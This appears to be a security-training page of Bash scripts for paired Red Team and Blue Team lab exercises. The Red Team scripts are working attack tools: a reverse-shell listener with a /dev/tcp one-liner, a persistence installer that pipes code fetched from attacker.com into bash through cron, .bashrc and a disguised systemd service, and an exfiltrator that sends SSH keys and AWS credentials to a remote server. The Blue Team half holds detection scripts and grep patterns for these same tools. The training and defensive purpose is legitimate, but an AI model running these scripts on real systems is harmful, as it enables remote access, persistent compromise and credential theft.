# Intermediate Bash Scripts for Security Training

## Overview

These intermediate bash scripts provide hands-on practice for both Red Team (attack simulation) and Blue Team (detection/defense) scenarios.

---

## Red Team Scripts

### RT-I01: Reverse Shell Listener

```bash
#!/bin/bash
#######################################
# Reverse Shell Listener
# For authorized lab testing only
#######################################

PORT="${1:-4444}"

echo "[*] Reverse Shell Listener"
echo "[*] Listening on port: $PORT"
echo "[*] Waiting for connections..."
echo ""
echo "[*] To connect from target:"
echo "    bash -i >& /dev/tcp/$(hostname -I | awk '{print $1}')/$PORT 0>&1"
echo ""

nc -lvnp "$PORT"
```

### RT-I02: Persistence Installer

```bash
#!/bin/bash
#######################################
# Linux Persistence Installer
# For authorized lab testing only
#######################################

PAYLOAD_URL="${1:-http://attacker.com/beacon.sh}"
PAYLOAD_PATH="/tmp/.update.sh"

echo "[*] Installing persistence mechanisms..."

# Create beacon script
cat > "$PAYLOAD_PATH" << 'EOF'
#!/bin/bash
# Beacon script
while true; do
    curl -s "$PAYLOAD_URL" | bash 2>/dev/null
    sleep 300
done
EOF
chmod +x "$PAYLOAD_PATH"

# Method 1: Crontab
echo "[*] Adding cron job..."
(crontab -l 2>/dev/null; echo "@reboot $PAYLOAD_PATH") | crontab -

# Method 2: bashrc
echo "[*] Adding to .bashrc..."
echo "nohup $PAYLOAD_PATH &>/dev/null &" >> ~/.bashrc

# Method 3: Systemd user service (if available)
if [ -d ~/.config/systemd/user ]; then
    echo "[*] Creating systemd user service..."
    mkdir -p ~/.config/systemd/user
    cat > ~/.config/systemd/user/update.service << EOF
[Unit]
Description=System Update Service
[Service]
ExecStart=$PAYLOAD_PATH
Restart=always
[Install]
WantedBy=default.target
EOF
    systemctl --user enable update.service 2>/dev/null
fi

echo "[+] Persistence installed"
```

### RT-I03: Data Exfiltrator

```bash
#!/bin/bash
#######################################
# Data Exfiltration Script
# For authorized lab testing only
#######################################

EXFIL_SERVER="${1:-http://attacker.com:8080/collect}"
DATA_DIR="/tmp/.exfil_staging"

mkdir -p "$DATA_DIR"

echo "[*] Collecting data for exfiltration..."

# Collect sensitive files
collect_data() {
    # SSH keys
    cp ~/.ssh/id_* "$DATA_DIR/" 2>/dev/null

    # Bash history
    cp ~/.bash_history "$DATA_DIR/bash_history" 2>/dev/null

    # Configuration files
    cp ~/.gitconfig "$DATA_DIR/" 2>/dev/null
    cp ~/.aws/credentials "$DATA_DIR/aws_creds" 2>/dev/null

    # System info
    uname -a > "$DATA_DIR/system_info.txt"
    whoami >> "$DATA_DIR/system_info.txt"
    id >> "$DATA_DIR/system_info.txt"

    # Network info
    ip addr > "$DATA_DIR/network_info.txt" 2>/dev/null
    cat /etc/hosts >> "$DATA_DIR/network_info.txt"
}

collect_data

# Archive data
echo "[*] Creating archive..."
tar -czf "$DATA_DIR/data.tar.gz" -C "$DATA_DIR" . 2>/dev/null

# Exfiltrate
echo "[*] Exfiltrating to: $EXFIL_SERVER"

# Method 1: HTTP POST
curl -s -X POST -F "file=@$DATA_DIR/data.tar.gz" "$EXFIL_SERVER" 2>/dev/null

# Method 2: DNS (if HTTP fails)
# base64 "$DATA_DIR/data.tar.gz" | xxd -p | while read line; do
#     nslookup "$line.exfil.attacker.com" &>/dev/null
# done

# Cleanup
rm -rf "$DATA_DIR"

echo "[+] Exfiltration complete"
```

---

## Blue Team Scripts

### BT-I01: Persistence Hunter

```bash
#!/bin/bash
#######################################
# Linux Persistence Hunter
# Detect common persistence mechanisms
#######################################

RED='\033[0;31m'
YELLOW='\033[1;33m'
GREEN='\033[0;32m'
NC='\033[0m'

FINDINGS=0

alert() {
    echo -e "${RED}[ALERT]${NC} $1"
    ((FINDINGS++))
}

warn() {
    echo -e "${YELLOW}[WARN]${NC} $1"
}

ok() {
    echo -e "${GREEN}[OK]${NC} $1"
}

echo "════════════════════════════════════════════════════"
echo "         Linux Persistence Hunter"
echo "════════════════════════════════════════════════════"
echo ""

# Check crontabs
echo "[*] Checking crontabs..."
for user in $(cut -d: -f1 /etc/passwd); do
    cron=$(crontab -u "$user" -l 2>/dev/null)
    if echo "$cron" | grep -qiE "/tmp/|/dev/shm/|curl|wget|nc "; then
        alert "Suspicious cron entry for $user"
        echo "$cron" | grep -iE "/tmp/|/dev/shm/|curl|wget|nc "
    fi
done

# Check systemd services
echo ""
echo "[*] Checking systemd services..."
for service in /etc/systemd/system/*.service ~/.config/systemd/user/*.service 2>/dev/null; do
    if [ -f "$service" ]; then
        if grep -qiE "/tmp/|/dev/shm/|curl|wget" "$service" 2>/dev/null; then
            alert "Suspicious systemd service: $service"
        fi
    fi
done

# Check rc.local
echo ""
echo "[*] Checking rc.local..."
if [ -f /etc/rc.local ]; then
    if grep -qiE "curl|wget|nc |/tmp/" /etc/rc.local; then
        alert "Suspicious entry in rc.local"
    fi
fi

# Check bashrc files
echo ""
echo "[*] Checking shell profiles..."
for profile in /home/*/.bashrc /home/*/.bash_profile /root/.bashrc; do
    if [ -f "$profile" ]; then
        if grep -qiE "curl|wget|nc |nohup|&>/dev/null" "$profile" 2>/dev/null; then
            warn "Suspicious entry in: $profile"
            grep -iE "curl|wget|nc |nohup|&>/dev/null" "$profile"
        fi
    fi
done

# Check for suspicious processes
echo ""
echo "[*] Checking running processes..."
ps aux | grep -iE "nc.*-e|/tmp/\.|/dev/shm/\." | grep -v grep | while read line; do
    alert "Suspicious process: $line"
done

# Check authorized_keys
echo ""
echo "[*] Checking SSH authorized_keys..."
for keys in /home/*/.ssh/authorized_keys /root/.ssh/authorized_keys; do
    if [ -f "$keys" ]; then
        lines=$(wc -l < "$keys")
        if [ "$lines" -gt 3 ]; then
            warn "Multiple SSH keys in: $keys ($lines keys)"
        fi
    fi
done

# Summary
echo ""
echo "════════════════════════════════════════════════════"
if [ $FINDINGS -gt 0 ]; then
    echo -e "${RED}TOTAL FINDINGS: $FINDINGS${NC}"
else
    echo -e "${GREEN}No obvious persistence mechanisms found${NC}"
fi
echo "════════════════════════════════════════════════════"
```

### BT-I02: Network Anomaly Detector

```bash
#!/bin/bash
#######################################
# Network Anomaly Detector
# Identify suspicious connections
#######################################

SUSPICIOUS_PORTS="4444 5555 6666 7777 8888 9999 1234 31337"
LOG_FILE="/var/log/network_anomalies.log"

echo "════════════════════════════════════════════════════"
echo "         Network Anomaly Detector"
echo "════════════════════════════════════════════════════"
echo ""

# Check for connections to suspicious ports
echo "[*] Checking for suspicious port connections..."
for port in $SUSPICIOUS_PORTS; do
    connections=$(ss -tn state established "dport = :$port" 2>/dev/null)
    if [ -n "$connections" ]; then
        echo "[ALERT] Connections to suspicious port $port:"
        echo "$connections"
        echo "$(date) - Port $port connection detected" >> "$LOG_FILE"
    fi
done

# Check for unusual outbound connections
echo ""
echo "[*] Checking outbound connections..."
ss -tn state established 2>/dev/null | awk 'NR>1 {print $4}' | \
    cut -d: -f1 | sort | uniq -c | sort -rn | head -10 | \
    while read count ip; do
        if [ "$count" -gt 10 ]; then
            echo "[WARN] High connection count to $ip: $count connections"
        fi
    done

# Check for data transfer anomalies
echo ""
echo "[*] Checking for large data transfers..."
for iface in $(ip -o link show | awk -F': ' '{print $2}' | grep -v lo); do
    tx=$(cat /sys/class/net/$iface/statistics/tx_bytes 2>/dev/null)
    rx=$(cat /sys/class/net/$iface/statistics/rx_bytes 2>/dev/null)
    echo "Interface $iface: TX=$((tx/1024/1024))MB RX=$((rx/1024/1024))MB"
done

# Check for DNS anomalies (if tcpdump available)
echo ""
echo "[*] Checking recent DNS queries..."
if [ -f /var/log/dnsmasq.log ]; then
    # Count queries by domain
    tail -500 /var/log/dnsmasq.log | grep "query" | \
        awk '{print $6}' | sort | uniq -c | sort -rn | head -10
fi

# Check listening services
echo ""
echo "[*] Checking for unexpected listening services..."
ss -tulpn | grep -vE ":22|:80|:443|127.0.0.1" | while read line; do
    port=$(echo "$line" | awk '{print $5}' | rev | cut -d: -f1 | rev)
    proc=$(echo "$line" | awk '{print $7}')
    echo "[INFO] Listening: port $port by $proc"
done
```

### BT-I03: Log Analyzer

```bash
#!/bin/bash
#######################################
# Security Log Analyzer
# Parse logs for indicators
#######################################

echo "════════════════════════════════════════════════════"
echo "         Security Log Analyzer"
echo "════════════════════════════════════════════════════"
echo ""

# Auth log analysis
echo "[*] Analyzing authentication logs..."
if [ -f /var/log/auth.log ]; then
    echo ""
    echo "Failed logins (last 100):"
    grep "Failed" /var/log/auth.log | tail -100 | \
        awk '{print $1, $2, $3, $9, $11}' | sort | uniq -c | sort -rn | head -10

    echo ""
    echo "Successful sudo commands:"
    grep "sudo:" /var/log/auth.log | grep "COMMAND" | tail -20

    echo ""
    echo "New sessions:"
    grep "session opened" /var/log/auth.log | tail -10
fi

# Syslog analysis
echo ""
echo "[*] Analyzing syslog..."
if [ -f /var/log/syslog ]; then
    echo ""
    echo "USB device events (last 24h):"
    grep -i "usb" /var/log/syslog | grep "$(date -d '1 day ago' '+%b %d')" | tail -20

    echo ""
    echo "Kernel warnings/errors:"
    grep -iE "warn|error" /var/log/syslog | tail -10
fi

# Audit log analysis (if available)
if [ -f /var/log/audit/audit.log ]; then
    echo ""
    echo "[*] Analyzing audit logs..."

    echo ""
    echo "Executed commands (execve):"
    ausearch -m execve --start today 2>/dev/null | tail -20

    echo ""
    echo "File access attempts:"
    ausearch -m path --start today 2>/dev/null | tail -20
fi

# Web server logs (if available)
for logfile in /var/log/apache2/access.log /var/log/nginx/access.log; do
    if [ -f "$logfile" ]; then
        echo ""
        echo "[*] Analyzing web logs: $logfile"

        echo ""
        echo "Top requesters:"
        awk '{print $1}' "$logfile" | sort | uniq -c | sort -rn | head -10

        echo ""
        echo "Suspicious requests:"
        grep -iE "cmd=|exec=|system\(|eval\(" "$logfile" | tail -10
    fi
done
```

---

## Combined Red/Blue Exercises

### Exercise I-01: Attack and Detect

**Red Team Task:**
1. Run RT-I02 to install persistence
2. Run RT-I03 to stage data exfiltration

**Blue Team Task:**
1. Use BT-I01 to find the persistence mechanisms
2. Use BT-I02 to detect the exfiltration attempt
3. Document findings with timestamps

### Exercise I-02: Incident Simulation

**Setup:**
```bash
# Red Team setup (run as attacker)
./rt_i02_persistence.sh
echo "FLAG{persistence_installed}" > /tmp/.beacon_flag.txt
```

**Challenge:**
1. Blue Team must find the flag
2. Identify all persistence mechanisms
3. Remove them without detection

---

## Detection Signatures

### For RT-I01 (Reverse Shell)
```bash
# Detect reverse shell connection attempts
ps aux | grep -E "bash.*-i.*>/dev/tcp|nc.*-e"
ss -tn | grep -E ":4444|:5555|:6666"
```

### For RT-I02 (Persistence)
```bash
# Check all persistence locations
crontab -l
cat ~/.bashrc | grep -v "^#"
systemctl --user list-unit-files
```

### For RT-I03 (Exfiltration)
```bash
# Monitor for data collection
inotifywait -m /tmp -e create,modify
# Monitor outbound HTTP POST
tcpdump -i any 'tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)'
```

---

[← Back to Intermediate](../README.md)
